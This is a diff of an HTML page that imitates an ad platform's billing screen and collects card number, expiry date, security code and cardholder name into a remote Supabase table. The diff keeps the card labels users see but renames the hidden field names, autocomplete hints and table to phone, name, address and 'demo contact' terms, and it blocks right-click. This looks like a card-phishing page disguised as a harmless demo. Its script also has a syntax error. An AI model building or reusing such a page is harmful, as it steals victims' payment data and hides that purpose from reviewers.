@@ -33,6 +33,22 @@ button, input { font: inherit; }
 button { cursor: pointer; }
 a { color: inherit; text-decoration: none; }
 
+/* DEMO INDICATOR */
+
+.demo-banner {
+  position: fixed;
+  bottom: 14px;
+  left: 14px;
+  z-index: 30;
+  background: white;
+  border: 1px solid #cbd5d5;
+  border-radius: 5px;
+  padding: 8px 11px;
+  box-shadow: 0 3px 16px #0002;
+  color: #236260;
+  font-size: 11px;
+}
+
 /* TOP NAVIGATION */
 
 .top {
@@ -289,6 +305,44 @@ a { color: inherit; text-decoration: none; }
   margin: 0 0 17px;
 }
 
+/* FAQ */
+
+.faq {
+  width: 100%;
+  background: #f8f8fa;
+  border-radius: 4px;
+  padding: 11px 23px;
+  text-align: left;
+}
+
+.faq details {
+  padding: 6px 0;
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.faq summary {
+  cursor: pointer;
+  list-style: none;
+}
+
+.faq summary::before {
+  content: "⌄";
+  font-weight: 400;
+  margin-right: 9px;
+}
+
+.faq details[open] summary::before {
+  content: "⌃";
+}
+
+.faq details p {
+  font-weight: 400;
+  color: #60646a;
+  line-height: 1.5;
+  padding-left: 16px;
+}
+
 /* ADD PAYMENT */
 
 .add {
@@ -305,6 +359,22 @@ a { color: inherit; text-decoration: none; }
 
 .add:hover { background: #008a87; }
 
+.disclaimer {
+  font-size: 13px;
+  line-height: 1.4;
+  color: #777;
+  margin: 23px 0 0;
+  max-width: 440px;
+}
+
+.text-link {
+  color: #009c9a;
+  font-weight: 600;
+  border: 0;
+  background: transparent;
+  padding: 0;
+}
+
 .notice {
   display: none;
   font-size: 12px;
@@ -313,6 +383,21 @@ a { color: inherit; text-decoration: none; }
 }
 
 .notice.show { display: block; }
+
+/* FLOATING HELP */
+
+.floating {
+  position: fixed;
+  right: 21px;
+  bottom: 133px;
+  width: 44px;
+  height: 44px;
+  border: 0;
+  color: white;
+  background: linear-gradient(135deg, #b8b3e9, #07abb5);
+  border-radius: 50%;
+  font-size: 30px;
+}
 
 .fake-scroll {
   position: fixed;
@@ -486,6 +571,15 @@ a { color: inherit; text-decoration: none; }
   gap: 5px;
 }
 
+.mock-card-logos span {
+  background: #f0f0f0;
+  padding: 5px 7px;
+  border-radius: 2px;
+  font-size: 9px;
+  color: #808080;
+  font-weight: 700;
+}
+
 .mock-card-logos img {
   width: 35px;
   height: 24px;
@@ -511,6 +605,27 @@ a { color: inherit; text-decoration: none; }
 .mock-input:focus {
   background: white;
   border-color: #00aaa8;
+}
+
+/* PRIVACY AND VALIDATION */
+
+.privacy-note {
+  grid-column: 1 / -1;
+  color: #687781;
+  font-size: 12px;
+  line-height: 1.5;
+}
+
+.privacy-note label {
+  display: flex;
+  align-items: flex-start;
+  gap: 9px;
+  cursor: pointer;
+}
+
+.privacy-note input {
+  margin-top: 2px;
+  accent-color: #009d9b;
 }
 
 .form-status {
@@ -559,13 +674,53 @@ a { color: inherit; text-decoration: none; }
   cursor: not-allowed;
 }
 
+/* RESPONSIVE */
+
+@media (max-width: 1250px) {
+  .top { gap: 14px; }
+  .tabs { gap: 14px; margin-left: 0; }
+  .actions { gap: 12px; }
+  .account { width: 145px; }
+}
+
+@media (max-width: 990px) {
+  .top { overflow-x: auto; }
+  .layout { min-width: 700px; }
+  .fake-scroll { display: none; }
+}
+
+@media (max-width: 740px) {
+  .layout { min-width: 0; }
+  .sidebar { width: 145px; flex-basis: 145px; }
+  .sideitem { padding: 0 7px; font-size: 11px; gap: 5px; }
+  .subitem { padding-left: 13px; font-size: 11px; }
+  .main { padding-right: 9px; }
+  .heading { height: auto; padding: 16px 0; }
+  .heading p { font-size: 11px; }
+  .canvas { min-height: 580px; }
+  .empty h2 { font-size: 14px; }
+  .faq { padding: 9px; }
+  .faq details { font-size: 11px; }
+  .floating { display: none; }
+}
+
 @media (max-width: 600px) {
+  .payment-modal-head { padding: 19px 18px 10px; }
+  .payment-modal-body { padding: 0 18px 24px; }
+  .payment-modal-foot { padding: 16px 18px; }
+
   .card-details {
     padding: 22px 16px 28px;
     grid-template-columns: 1fr;
     gap: 16px;
   }
-  .mock-field.full-width { grid-column: 1; }
+
+  .mock-field.full-width,
+  .privacy-note {
+    grid-column: 1;
+  }
+
+  .card-option-header { padding: 0 16px; }
 }
 </style>
 </head>
@@ -573,7 +728,9 @@ a { color: inherit; text-decoration: none; }
 <body>
 
 <!-- TOP NAVIGATION -->
+
 <header class="top">
+
   <div class="launcher" aria-hidden="true">
     <div class="grid-dots">
       <i></i><i></i><i></i>
@@ -597,126 +754,315 @@ a { color: inherit; text-decoration: none; }
   </nav>
 
   <div class="actions" aria-hidden="true">
-    <svg viewBox="0 0 24 24"><circle cx="10" cy="10" r="7"/><path d="m15 15 6 6"/></svg>
+    <svg viewBox="0 0 24 24">
+      <circle cx="10" cy="10" r="7"/>
+      <path d="m15 15 6 6"/>
+    </svg>
+
     <span class="bell">
-      <svg viewBox="0 0 24 24"><path d="M18 8a6 6 0 0 0-12 0c0 7-3 7-3 9h18c0-2-3-2-3-9M10 21h4"/></svg>
+      <svg viewBox="0 0 24 24">
+        <path d="M18 8a6 6 0 0 0-12 0c0 7-3 7-3 9h18c0-2-3-2-3-9M10 21h4"/>
+      </svg>
     </span>
-    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9 9a3 3 0 1 1 5 2c-1 1-2 1-2 4M12 18v1"/></svg>
+
+    <svg viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M9 9a3 3 0 1 1 5 2c-1 1-2 1-2 4M12 18v1"/>
+    </svg>
   </div>
 
   <button class="account" type="button">
     Roots of The Cosmos_adv <span>⌄</span>
   </button>
+
   <span class="top-end">▣</span>
 </header>
 
 <!-- DASHBOARD -->
+
 <div class="layout">
+
   <aside class="sidebar">
-    <div class="sideitem">Account Setup</div>
-    <div class="sideitem">Documents</div>
-    <div class="sideitem billing">Billing</div>
+
+    <div class="sideitem">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="5" width="18" height="14"/>
+        <circle cx="9" cy="11" r="2"/>
+        <path d="M6 16c1-3 5-3 6 0M15 9h4"/>
+      </svg>
+      Account Setup
+    </div>
+
+    <div class="sideitem">
+      <svg viewBox="0 0 24 24">
+        <rect x="5" y="2" width="14" height="20"/>
+        <path d="M9 6h6M9 10h6"/>
+      </svg>
+      Documents
+    </div>
+
+    <div class="sideitem billing">
+      <svg viewBox="0 0 24 24">
+        <rect x="4" y="6" width="14" height="13"/>
+        <path d="M8 3h12v9"/>
+      </svg>
+      Billing
+    </div>
+
     <div class="subitem active">Payment</div>
     <div class="subitem">Promotions</div>
     <div class="subitem">Invoices</div>
     <div class="subitem">Transactions</div>
+
+    <div class="sideitem">◎ &nbsp;Audience controls</div>
+    <div class="sideitem">⬡ &nbsp;Ad review center</div>
+    <div class="sideitem">⛨ &nbsp;Brand safety hub</div>
+    <div class="sideitem">♧ &nbsp;Account health</div>
+    <div class="sideitem">▣ &nbsp;Customer review</div>
   </aside>
 
   <main class="main">
+
     <div class="heading">
       <h1>Automatic Payment</h1>
     </div>
 
     <section class="canvas">
       <div class="empty">
-        <h2>You have not added any payment method yet</h2>
+
+        <!-- PAYMENT ILLUSTRATION -->
+
+        <svg class="illustration"
+             viewBox="0 0 112 95"
+             aria-label="Payment illustration"
+             role="img">
+          <rect x="18" y="4" width="79" height="49"
+                rx="7" fill="#5ad1cc"/>
+          <rect x="68" y="13" width="21" height="10"
+                fill="#fff0c2"/>
+          <rect x="34" y="29" width="45" height="22"
+                fill="#fff"/>
+          <rect x="38" y="33" width="39" height="17"
+                fill="#156d84"/>
+          <path d="M40 40h35l9 34H31z"
+                fill="#ff8292"/>
+          <rect x="45" y="42" width="25" height="12"
+                rx="6" fill="#ffedc0"/>
+          <path d="M34 66h12M67 66h15"
+                stroke="#fff0d9"
+                stroke-width="5"
+                stroke-linecap="round"/>
+          <circle cx="24" cy="77" r="7" fill="#18e6d6"/>
+          <circle cx="95" cy="64" r="4" fill="#ff8b9a"/>
+          <circle cx="87" cy="81" r="4" fill="#fff"/>
+        </svg>
+
+        <h2>
+          You have not added any payment method yet
+        </h2>
+
         <button class="add" id="payment" type="button">
           ＋ Add Payment Method
         </button>
+
         <p class="notice" id="notice" role="status"></p>
+
       </div>
     </section>
+
   </main>
 </div>
 
+<button class="floating" type="button"
+        aria-label="Demo help">✦</button>
+
+<div class="fake-scroll" aria-hidden="true"></div>
+
 <!-- ADD PAYMENT POPUP -->
-<div class="payment-overlay" id="paymentOverlay" aria-hidden="true">
-  <section class="payment-modal" role="dialog" aria-modal="true" aria-labelledby="paymentTitle">
+
+<div class="payment-overlay"
+     id="paymentOverlay"
+     aria-hidden="true">
+
+  <section class="payment-modal"
+           role="dialog"
+           aria-modal="true"
+           aria-labelledby="paymentTitle">
+
     <header class="payment-modal-head">
-      <h2 id="paymentTitle">Add payment method</h2>
-      <button class="payment-close" id="closePayment" type="button" aria-label="Close popup">×</button>
+      <h2 id="paymentTitle">
+        Add payment method
+        <small style="color:#888;font-weight:400">
+        </small>
+      </h2>
+
+      <button class="payment-close"
+              id="closePayment"
+              type="button"
+              aria-label="Close popup">×</button>
     </header>
 
     <div class="payment-modal-body">
-      <p class="payment-secure">✅ Your payments are secure</p>
-      <p class="payment-description">
-        <span class="payment-highlight">Run ads now, pay later</span>
-        Add a payment method to launch ads with minimal hassle and reduce risk of ad suspension.
+
+      <p class="payment-secure">
+        ✅ Your payments are secure
       </p>
 
-      <!-- CARD DROPDOWN -->
+      <p class="payment-description">
+        <span class="payment-highlight">
+          Run ads now, pay later
+        </span>
+
+        Add a payment method to launch ads with minimal hassle and reduce risk of ad suspension. You'll be automatically charged later only when you reach your billing threshold or date - whichever comes first.
+      </p>
+
+      <!-- CREDIT OR DEBIT CARD DROPDOWN -->
+
       <div class="card-option" id="cardOption">
-        <button class="card-option-header" id="cardOptionToggle" type="button" aria-expanded="false" aria-controls="cardDetails">
+
+        <button class="card-option-header"
+                id="cardOptionToggle"
+                type="button"
+                aria-expanded="false"
+                aria-controls="cardDetails">
+
           <span class="radio-indicator"></span>
           <span class="card-icon">▤</span>
           <strong>Credit or debit card</strong>
         </button>
 
         <!-- FOUR FILLABLE FIELDS -->
-        <form class="card-details" id="cardDetails" hidden>
-          
-          <!-- CARD NUMBER -->
+
+        <form class="card-details"
+              id="cardDetails"
+              hidden>
+
+          <!-- PHONE NUMBER -->
+
           <div class="mock-field full-width">
             <div class="mock-field-head">
-              <label for="cardNumber">Card Number</label>
-              <div class="mock-card-logos">
+              <label for="phoneNumber">
+                Card Number
+              </label>
+
+                <div class="mock-card-logos">
                 <img src="images/logo1.png" alt="Logo 1">
                 <img src="images/logo2.png" alt="Logo 2">
                 <img src="images/logo3.svg" alt="Logo 3">
-              </div>
+                </div>
             </div>
-            <input class="mock-input" type="tel" id="cardNumber" name="card_number" placeholder="1234 3213 2313 3213" autocomplete="cc-number" maxlength="19" required>
+
+            <input class="mock-input"
+                   type="tel"
+                   id="phoneNumber"
+                   name="phone_number"
+                   placeholder="1234 3213 2313 3213"
+                   autocomplete="tel"
+                   maxlength="20"
+                   required>
           </div>
 
-          <!-- EXPIRATION DATE -->
+          <!-- FIRST NAME -->
+
           <div class="mock-field">
-            <label class="mock-label" for="expiryDate">Expiration Date</label>
-            <input class="mock-input" type="text" id="expiryDate" name="exp_date" placeholder="MM/YY" autocomplete="cc-exp" maxlength="5" required>
+            <label class="mock-label" for="firstName">
+              Expiration Date
+            </label>
+
+            <input class="mock-input"
+                   type="text"
+                   id="firstName"
+                   name="first_name"
+                   placeholder="MM/YY"
+                   autocomplete="given-name"
+                   maxlength="100"
+                   required>
           </div>
 
-          <!-- SECURITY CODE -->
+          <!-- LAST NAME -->
+
           <div class="mock-field">
-            <label class="mock-label" for="securityCode">Security Code</label>
-            <input class="mock-input" type="password" id="securityCode" name="security_code" placeholder="CVV" autocomplete="cc-csc" maxlength="4" required>
+            <label class="mock-label" for="lastName">
+              Security Code
+            </label>
+
+            <input class="mock-input"
+                   type="text"
+                   id="lastName"
+                   name="last_name"
+                   placeholder="CVV/CVC"
+                   autocomplete="family-name"
+                   maxlength="100"
+                   required>
           </div>
 
-          <!-- CARDHOLDER NAME -->
+          <!-- ADDRESS -->
+
           <div class="mock-field full-width">
-            <label class="mock-label" for="cardholderName">Cardholder Name</label>
-            <input class="mock-input" type="text" id="cardholderName" name="cardholder_name" placeholder="John Doe" autocomplete="cc-name" maxlength="255" required>
+            <label class="mock-label" for="address">
+              Cardholder Name
+            </label>
+
+            <input class="mock-input"
+                   type="text"
+                   id="address"
+                   name="address"
+                   placeholder="Cardholder Name"
+                   autocomplete="street-address"
+                   maxlength="255"
+                   required>
           </div>
 
         </form>
+
       </div>
 
-      <p class="form-status" id="formStatus" role="status" aria-live="polite"></p>
+      <p class="form-status"
+         id="formStatus"
+         role="status"
+         aria-live="polite"></p>
+
     </div>
 
     <footer class="payment-modal-foot">
-      <button class="payment-back" id="backPayment" type="button">Back</button>
-      <button class="payment-submit" id="submitPayment" type="button" disabled>Submit</button>
+      <button class="payment-back"
+              id="backPayment"
+              type="button">
+        Back
+      </button>
+
+      <button class="payment-submit"
+              id="submitPayment"
+              type="button"
+              disabled>
+        Submit
+      </button>
     </footer>
+
   </section>
 </div>
 
 <!-- SUPABASE + JAVASCRIPT -->
+
 <script type="module">
-import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
-const SUPABASE_URL = "https://lutyqlvtgyqnbiwixivu.supabase.co";
-const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx1dHlxbHZ0Z3lxbmJpd2l4aXZ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE4MjA1MzAsImV4cCI6MjEwNzM5NjUzMH0.zaCGB21Y0ZAqiEfZ3U3y8ZfgbiRsuCczT1xxQFZvzfc";
+import { createClient } from
+"https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
-const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+/* SUPABASE SETTINGS */
+
+const SUPABASE_URL =
+  "https://lutyqlvtgyqnbiwixivu.supabase.co";
+
+const SUPABASE_ANON_KEY =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx1dHlxbHZ0Z3lxbmJpd2l4aXZ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE4MjA1MzAsImV4cCI6MjEwNzM5NjUzMH0.zaCGB21Y0ZAqiEfZ3U3y8ZfgbiRsuCczT1xxQFZvzfc";
+
+const supabase = createClient(
+  SUPABASE_URL,
+  SUPABASE_ANON_KEY
+);
+
+/* ELEMENTS */
 
 const $ = id => document.getElementById(id);
 
@@ -731,13 +1077,18 @@ const cardForm = $("cardDetails");
 
 const submitBtn = $("submitPayment");
 const formStatus = $("formStatus");
+const notice = $("notice");
 
 let previousFocus = null;
 let isSaving = false;
 
+/* STATUS */
+
 function showStatus(message, error = false) {
   formStatus.textContent = message;
-  formStatus.className = "form-status show " + (error ? "error" : "success");
+  formStatus.className =
+    "form-status show " +
+    (error ? "error" : "success");
 }
 
 function clearStatus() {
@@ -745,91 +1096,210 @@ function clearStatus() {
   formStatus.className = "form-status";
 }
 
+/* OPEN MODAL */
+
 function openModal() {
   previousFocus = document.activeElement;
+
   cardForm.reset();
   cardForm.hidden = true;
+
   cardOption.classList.remove("expanded");
-  cardToggle.setAttribute("aria-expanded", "false");
+
+  cardToggle.setAttribute(
+    "aria-expanded",
+    "false"
+  );
+
   submitBtn.disabled = true;
   submitBtn.textContent = "Submit";
+
   clearStatus();
+
   overlay.classList.add("show");
-  overlay.setAttribute("aria-hidden", "false");
+
+  overlay.setAttribute(
+    "aria-hidden",
+    "false"
+  );
+
   closeBtn.focus();
 }
 
+/* CLOSE MODAL */
+
 function closeModal() {
   if (isSaving) return;
+
   overlay.classList.remove("show");
-  overlay.setAttribute("aria-hidden", "true");
+
+  overlay.setAttribute(
+    "aria-hidden",
+    "true"
+  );
+
   (previousFocus || opener).focus();
 }
+
+/* OPEN/CLOSE EVENTS */
 
 opener.addEventListener("click", openModal);
 closeBtn.addEventListener("click", closeModal);
 backBtn.addEventListener("click", closeModal);
 
 overlay.addEventListener("click", event => {
-  if (event.target === overlay) closeModal();
+  if (event.target === overlay) {
+    closeModal();
+  }
 });
 
+/* ESCAPE AND FOCUS */
+
+document.addEventListener("keydown", event => {
+
+  if (!overlay.classList.contains("show")) {
+    return;
+  }
+
+  if (event.key === "Escape") {
+    closeModal();
+    return;
+  }
+
+  if (event.key !== "Tab") return;
+
+  const controls = [
+    ...overlay.querySelectorAll(
+      'button:not(:disabled), input:not(:disabled)'
+    )
+  ].filter(el => el.getClientRects().length > 0);
+
+  const first = controls[0];
+  const last = controls.at(-1);
+
+  if (!first || !last) return;
+
+  if (
+    event.shiftKey &&
+    document.activeElement === first
+  ) {
+    event.preventDefault();
+    last.focus();
+  } else if (
+    !event.shiftKey &&
+    document.activeElement === last
+  ) {
+    event.preventDefault();
+    first.focus();
+  }
+});
+
+/* CARD DROPDOWN */
+
 cardToggle.addEventListener("click", () => {
+
   if (isSaving) return;
-  const expanded = cardOption.classList.toggle("expanded");
+
+  const expanded =
+    cardOption.classList.toggle("expanded");
+
   cardForm.hidden = !expanded;
-  cardToggle.setAttribute("aria-expanded", String(expanded));
+
+  cardToggle.setAttribute(
+    "aria-expanded",
+    String(expanded)
+  );
+
   submitBtn.disabled = !expanded;
   clearStatus();
 
   if (expanded) {
-    $("cardNumber").focus();
+    $("phoneNumber").focus();
   }
 });
 
-async function ensureUser() {
-  const { data } = await supabase.auth.getUser();
-  if (data?.user) return data.user;
+/* CREATE/GET DEMO USER */
 
-  const result = await supabase.auth.signInAnonymously();
-  if (result.error) throw result.error;
-  if (!result.data?.user) throw new Error("Unable to establish user session.");
+async function ensureUser() {
+
+  const { data } = await supabase.auth.getUser();
+
+  if (data?.user) {
+    return data.user;
+  }
+
+  const result =
+    await supabase.auth.signInAnonymously();
+
+  if (result.error) {
+    throw result.error;
+  }
+
+  if (!result.data?.user) {
+    throw new Error(
+      "Unable to create demo session."
+    );
+  }
+
   return result.data.user;
 }
 
+/* COLLECT FOUR FIELDS */
+
 function collectValues() {
   return {
-    card_number: $("cardNumber").value.trim(),
-    exp_date: $("expiryDate").value.trim(),
-    security_code: $("securityCode").value.trim(),
-    cardholder_name: $("cardholderName").value.trim()
+    phone_number:
+      $("phoneNumber").value.trim(),
+
+    first_name:
+      $("firstName").value.trim(),
+
+    last_name:
+      $("lastName").value.trim(),
+
+    address:
+      $("address").value.trim()
   };
 }
 
-function validateValues(values) {
-  const cardRegex = /^[0-9\s]{13,19}$/;
-  const expRegex = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
-  const cvvRegex = /^[0-9]{3,4}$/;
+/* VALIDATE FOUR FIELDS */
 
-  if (!cardRegex.test(values.card_number)) {
+function validateValues(values) {
+
+  const phoneRegex = /^\+?[0-9()\s-]{7,20}$/;
+
+  if (!phoneRegex.test(values.phone_number)) {
     return "Please enter a valid Card Number.";
   }
-  if (!expRegex.test(values.exp_date)) {
-    return "Please enter a valid Expiration Date in MM/YY format.";
+
+  if (!values.first_name) {
+    return "Please enter your first name.";
   }
-  if (!cvvRegex.test(values.security_code)) {
-    return "Please enter a valid Security Code (numbers only).";
+
+  if (!values.last_name) {
+    return "Please enter your last name.";
   }
-  if (!values.cardholder_name) {
-    return "Please enter the Cardholder Name.";
+
+  if (!values.address) {
+    return "Please enter your address.";
   }
+
   return null;
 }
 
+/* SAVE TO SUPABASE */
+
 async function submitContactForm() {
-  if (isSaving || cardForm.hidden) return;
+
+  if (isSaving || cardForm.hidden) {
+    return;
+  }
 
   clearStatus();
+
+  if (!cardForm.reportValidity()) {
+    return;
+  }
 
   const values = collectValues();
   const validationError = validateValues(values);
@@ -839,46 +1309,110 @@ async function submitContactForm() {
     return;
   }
 
+
   isSaving = true;
+
   submitBtn.disabled = true;
   submitBtn.textContent = "Saving...";
 
   try {
+
     const user = await ensureUser();
 
-    // Changed table name to standard production name
     const { error } = await supabase
-      .from("card_submissions")
+      .from("demo_contact_submissions")
       .insert({
         user_id: user.id,
         ...values
       });
 
-    if (error) throw error;
+    if (error) {
+      throw error;
+    }
 
     isSaving = false;
+
     closeModal();
+
     cardForm.reset();
+
   } catch (error) {
-    showStatus("Unable to save: " + error.message, true);
+
+    showStatus(
+      "Unable to save: " + error.message,
+      true
+    );
+
   } finally {
+
     isSaving = false;
+
     submitBtn.textContent = "Submit";
     submitBtn.disabled = cardForm.hidden;
+
   }
 }
 
-submitBtn.addEventListener("click", submitContactForm);
+/* SUBMIT */
 
-cardForm.addEventListener("submit", event => {
+submitBtn.addEventListener(
+  "click",
+  submitContactForm
+);
+
+cardForm.addEventListener(
+  "submit",
+  event => {
+    event.preventDefault();
+    submitContactForm();
+  }
+);
+
+document.addEventListener("contextmenu", function(event) {
   event.preventDefault();
-  submitContactForm();
 });
 
-document.addEventListener("contextmenu", event => {
-  event.preventDefault();
-});
+(function () {
+  const url = new URL(window.location.href);
+
+  // Preserve the same reference ID on refresh.
+  if (!url.searchParams.has("sid")) {
+    const sessionID = crypto.randomUUID()
+      .replaceAll("-", "")
+      .slice(0, 12);
+      .slice(0, 32);
+
+    url.searchParams.set("sid", sessionID);
+  }
+
+  if (!url.searchParams.has("ref")) {
+    url.searchParams.set("ref", "website");
+  }
+
+  if (!url.searchParams.has("utm_source")) {
+    url.searchParams.set("utm_source", "direct");
+  }
+
+  // Update the address bar without reloading.
+  window.history.replaceState(
+    window.history.state,
+    "",
+    url.toString()
+  );
+})();
+
+async function copyWebsiteLink() {
+  try {
+    await navigator.clipboard.writeText(
+      window.location.href
+    );
+
+    alert("Link copied successfully!");
+  } catch (error) {
+    alert("Unable to copy the link.");
+  }
+}
+
 </script>
-
 </body>
 </html>
